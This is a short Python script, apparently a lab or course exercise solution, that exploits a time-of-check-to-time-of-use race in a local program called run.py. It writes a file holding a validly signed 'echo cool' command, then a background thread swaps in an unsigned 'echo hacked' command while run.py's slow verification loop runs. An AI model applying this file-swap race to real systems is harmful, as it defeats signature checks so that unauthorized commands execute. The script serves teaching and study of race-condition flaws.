import json, os, time
import threading
import run



#Generate fix json file for passing the validate_script function in run.
def generate_fix_json_file():
    return json.dumps({"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"}
)

#Generate the exploit, we want to print 'hacked'
def generate_exploit(): 
    return json.dumps({"command": "echo hacked"})


#the tread sleep 10 seconds and then change the 'hack' file.
def thread_work(path):
    time.sleep(10)
    script = generate_exploit()
    with open(path, 'w') as writer:
        writer.write(script)



def main(argv):
    if not 1 == len(argv):
        print('USAGE: There is no need in argumants')
        return 1
    
    path = 'hack'
    #create the validate json file
    script = generate_fix_json_file()
    with open(path, 'w') as writer:
        writer.write(script)


    #create thread for changing the file when the run.py using the file.
    #There is a big loop in verify function, so in this time we can change the file and the 'command' to 'echo hacked'
    thread = threading.Thread(target=thread_work, args = (path,))
    thread.start()

    #running the 'run.py' file    
    os.system('python run.py ' + path)

    thread.join()

    


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
